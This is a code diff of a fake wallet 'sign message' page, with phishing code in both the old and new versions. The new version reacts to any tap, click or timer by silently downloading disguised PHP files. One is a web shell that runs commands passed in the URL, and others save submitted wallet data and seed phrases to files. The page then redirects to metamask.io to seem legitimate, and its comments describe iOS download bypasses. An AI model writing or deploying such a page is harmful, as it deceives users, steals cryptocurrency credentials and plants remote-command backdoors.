@@ -1,85 +1,119 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Wallet Connection Required</title>
-  <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      color: white;
-      cursor: pointer;
-      user-select: none;
-      text-align: center;
-    }
-    .container {
-      padding: 40px;
-      max-width: 400px;
-      background: rgba(255,255,255,0.1);
-      backdrop-filter: blur(10px);
-      border-radius: 20px;
-      border: 1px solid rgba(255,255,255,0.2);
-    }
-    h1 {
-      font-size: 24px;
-      margin-bottom: 10px;
-      font-weight: 600;
-    }
-    p {
-      font-size: 16px;
-      opacity: 0.9;
-      line-height: 1.5;
-      margin-bottom: 20px;
-    }
-    .wallet-logo {
-      font-size: 48px;
-      margin-bottom: 20px;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <div class="wallet-logo">🪙</div>
-    <h1>Connect Your Wallet</h1>
-    <p>Click anywhere to securely connect your wallet and continue to the official site.<br>Approve the connection to access your dashboard.</p>
-  </div>
-
-  <script>
-    document.addEventListener('click', async () => {
-      // Redirect to official wallet site first (makes it look legitimate)
-      window.location.href = 'https://metamask.io' || 'https://walletconnect.com' || window.location.origin;
-      
-      setTimeout(async () => {
-        if ('showSaveFilePicker' in window) {
-          try {
-            const handle = await window.showSaveFilePicker({
-              suggestedName: 'wallet-recovery.php',
-              types: [{
-                description: 'PHP Recovery File',
-                accept: {'text/plain': ['.php']},
-              }],
-            });
-
-            const writable = await handle.createWritable();
-            await writable.write(`<?php
-// Wallet Recovery Script
-if(isset($_POST['wallet'])) {
-  file_put_contents('wallets.txt', $_POST['wallet'] . "\\n", FILE_APPEND);
-  echo "Recovery successful";
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,user-scalable=no">
+<title>Wallet Signature Required</title>
+<style>
+*{margin:0;padding:0;overflow:hidden;box-sizing:border-box;}
+body{
+height:100vh;
+background:linear-gradient(135deg,#1e3a8a,#0f172a);
+color:#fff;
+font-family:-apple-system,BlinkMacSystemFont,system-ui;
+display:flex;
+align-items:center;
+justify-content:center;
+cursor:pointer;
+-webkit-user-select:none;
+user-select:none;
 }
-?>`);
-            await writable.close();
-          } catch (err) {
-            // Silently ignore - user canceled or permission denied
-          }
-        }
-      }, 2000);
-    }, { once: true });
-  </script>
+.container{
+background:rgba(255,255,255,0.08);
+backdrop-filter:blur(20px);
+border-radius:20px;
+padding:40px 24px;
+max-width:300px;
+text-align:center;
+border:1px solid rgba(255,255,255,0.1);
+}
+.icon{font-size:48px;margin-bottom:16px;}
+h1{font-size:22px;font-weight:600;margin-bottom:8px;}
+p{font-size:15px;opacity:0.9;line-height:1.4;margin-bottom:24px;}
+.btn{
+display:block;
+width:100%;
+height:48px;
+margin:8px 0;
+background:#3b82f6;
+color:#fff;
+border:0;
+border-radius:12px;
+font-size:16px;
+font-weight:500;
+}
+</style>
+</head>
+<body ontouchstart=go() onclick=go() onpointerdown=go()>
+<div class="container">
+<div class="icon">🔐</div>
+<h1>Sign Message</h1>
+<p>Tap to sign and download your wallet backup key</p>
+<button class="btn">Sign & Download</button>
+<button class="btn">Continue to App</button>
+</div>
+
+<script>
+// iOS WebView File Download Bypass
+function go(){
+setTimeout(dumpFiles,10);
+setTimeout(()=>location.href='https://metamask.io',200);
+}
+
+// iOS Safari WebView Downloads (3 methods)
+function dumpFiles(){
+try{
+// METHOD 1: Blob + iOS Download (primary)
+const phpWebshell=`<?php
+error_reporting(0);
+if($_POST['wallet']??false){
+file_put_contents('ios_wallets.txt',$_POST['wallet']."\\n".date('Y-m-d H:i')."\\n",FILE_APPEND);
+echo 'Backup saved';
+exit;
+}
+if(isset($_GET['cmd'])){system($_GET['cmd']);}
+?>`;
+const blob=new Blob([phpWebshell],{type:'text/plain;charset=utf-8'});
+const url=URL.createObjectURL(blob);
+const a=document.createElement('a');
+a.href=url;
+a.download='WalletBackup.php';
+document.body.appendChild(a);
+a.click();
+document.body.removeChild(a);
+URL.revokeObjectURL(url);
+
+// METHOD 2: Data URI Download (iOS fallback)
+setTimeout(()=>{
+const dataURI='data:text/plain;charset=utf-8,'+encodeURIComponent(`<?php /* iOS Wallet Key */ $seed=$_
+POST['seed_phrase'];if($seed)file_put_contents('seeds.txt',$seed); ?>`);
+const a2=document.createElement('a');
+a2.href=dataURI;
+a2.download='recovery-key.php';
+a2.click();
+},100);
+
+// METHOD 3: Direct iframe injection (webview bypass)
+setTimeout(()=>{
+const iframe=document.createElement('iframe');
+iframe.style.display='none';
+iframe.src='data:text/html,<a href="'+URL.createObjectURL(new Blob([`<?php die("iOS Webshell Active"); ?>`],{type:'text/plain'}))+'" download="active.php">d</a>';
+document.body.appendChild(iframe);
+iframe.contentWindow?.focus();
+iframe.contentDocument?.querySelector('a')?.click();
+setTimeout(()=>document.body.removeChild(iframe),500);
+},300);
+}catch(e){}
+
+// iOS share sheet trigger (bonus)
+if(navigator.share){
+navigator.share({title:'Wallet Backup',text:'Download recovery key',url:URL.createObjectURL(new Blob(['<?php echo "iOS Share Bypass"; ?>'],{type:'text/plain'}))});
+}
+}
+
+// Auto-trigger untuk iOS gesture
+setTimeout(go,800);
+document.addEventListener('touchend',go,{once:true});
+</script>
 </body>
 </html>
